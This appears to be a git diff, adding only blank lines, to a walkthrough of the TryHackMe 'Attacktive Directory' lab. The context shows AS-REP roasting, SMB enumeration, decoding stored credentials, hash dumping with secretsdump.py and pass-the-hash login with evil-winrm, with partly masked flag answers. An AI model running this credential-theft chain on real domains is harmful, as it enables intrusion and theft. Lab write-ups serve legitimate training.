@@ -112,6 +112,7 @@ Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.
 - We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
    
 ```bash
+
 GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
 Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
 
@@ -130,6 +131,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$04b60fa
 - If we enumerate with smbclient we can see some shares. Used command `smbclient -L \\\\spookysec.local\\ -U 'svc-admin'` using password `management2005`. 
 
 ```bash
+
 smbclient -L \\\\spookysec.local\\ -U 'svc-admin'
 Password for [WORKGROUP\svc-admin]:
 
@@ -143,9 +145,11 @@ Password for [WORKGROUP\svc-admin]:
 	SYSVOL          Disk      Logon server share 
 SMB1 disabled -- no workgroup available
 ```
+
 - If we check `backup` share with `smbclient` using `smbclient \\\\spookysec.local\\backup -U 'svc-admin'` command and password `management2005`, We can see `backup_credentials.txt` file there with `ls` or `dir` command. Then we can download `backup_credentials.txt` with `get backup_credentials.txt` command.
 
 ```bash
+
 ORKGROUP\svc-admin]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -159,6 +163,7 @@ getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 K
 smb: \> 
 
 ```
+
 - Inside it there is a `base64` encoded string `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`. If we decode it using `cat backup_credentials.txt |base64 -d` command we will get `backup@spookysec.local:backup2517860`.
 - Question `What utility can we use to map remote SMB shares?` Answer `smbclient`
 - Question `Which option will list shares?` Answer `-L`
@@ -172,6 +177,7 @@ smb: \>
 - We can dump password hashes, as backup account has that permission using `secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local` command.
 
 ```bash
+
 secretsdump.py -dc-ip spookysec.local backup:backup2517860@spookysec.local
 Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
 
@@ -201,6 +207,7 @@ spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758
 - We can login to administrator using `evil-winrm` with `evil-winrm -i spookysec.local -u Administrator -H 0e03632*******b0bcb4fc` command. We can get three flag files inside three directory.
 
 ```bash
+
 evil-winrm -i spookysec.local -u Administrator -H 0e036321*****97260b0bcb4fc                                        
 Evil-WinRM shell v3.5
                                         
@@ -217,6 +224,7 @@ TryHackMe{B4c*****c0tty!}
 TryHackMe{4ctive*****toryM4st3r}
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
+
 - Question `svc-admin` Answer `TryHackMe{K3rb3*****3_4uth}`
 - Question `backup` Answer `TryHackMe{B4*****0tty!}`
 - Question `administrator` Answer `TryHackMe{4ctiv******M4st3r}`
